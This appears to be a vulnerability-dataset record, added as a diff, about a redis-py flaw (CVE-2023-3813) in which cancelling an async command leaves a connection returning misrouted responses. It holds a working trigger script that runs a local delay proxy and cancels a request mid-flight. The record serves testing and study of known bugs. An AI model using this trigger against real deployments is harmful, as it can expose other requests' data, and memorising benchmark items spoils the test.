@@ -1,0 +1,15 @@
+{
+  "file_id": "315_redis_issue_2665",
+  "numeric_id": "315",
+  "library_hint": "redis",
+  "source": "github_issue",
+  "title": "Canceling async Redis command leaves connection open in unsafe state for future commands",
+  "cve": "CVE-2023-3813",
+  "cwe": "CWE-770: Allocation of Resources Without Limits or Throttling",
+  "library": "redis-py",
+  "affected_version": ">= 4.3.0, < 4.5.4",
+  "vulnerable_function": "Redis._try_send_command_parse_response",
+  "triggerability": "indirect",
+  "trigger_payload": "import asyncio\nfrom redis.asyncio import Redis\nasync def pipe(reader: asyncio.StreamReader, writer: asyncio.StreamWriter, delay: float, name: str):\n    while data := await reader.read(1000):\n        await asyncio.sleep(delay)\n        writer.write(data)\n        await writer.drain()\n\nclass DelayProxy:\n    def __init__(self, addr, redis_addr, delay: float):\n        self.addr = addr\n        self.redis_addr = redis_addr\n        self.delay = delay\n    \n    async def start(self):\n        server = await asyncio.start_server(self.handle, *self.addr)\n        asyncio.create_task(server.serve_forever())\n    \n    async def handle(self, reader, writer):\n        redis_reader, redis_writer = await asyncio.open_connection(*self.redis_addr)\n        pipe1 = asyncio.create_task(pipe(reader, redis_writer, self.delay, 'to redis:'))\n        pipe2 = asyncio.create_task(pipe(redis_reader, writer, self.delay, 'from redis:'))\n        await asyncio.gather(pipe1, pipe2)\n\nasync def main():\n    dp = DelayProxy(addr=('localhost', 6380), redis_addr=('localhost', 6379), delay=0.1)\n    await dp.start()\n    async with Redis(host='localhost', port=6380) as r:\n        await r.set('foo', 'foo')\n        await r.set('bar', 'bar')\n        t = asyncio.create_task(r.get('foo'))\n        await asyncio.sleep(0.050)\n        t.cancel()\n        try:\n            await t\n            print('try again, we did not cancel the task in time')\n        except asyncio.CancelledError:\n            print('managed to cancel the task, connection is left open with unread response')\n        print('bar:', await r.get('bar'))\n        print('ping:', await r.ping())\n        print('foo:', await r.get('foo'))\n\nif __name__ == '__main__':\n    asyncio.run(main())",
+  "oracle": "Connection remains open with unread response, leading to inconsistent state and potential data disclosure or command failures"
+}
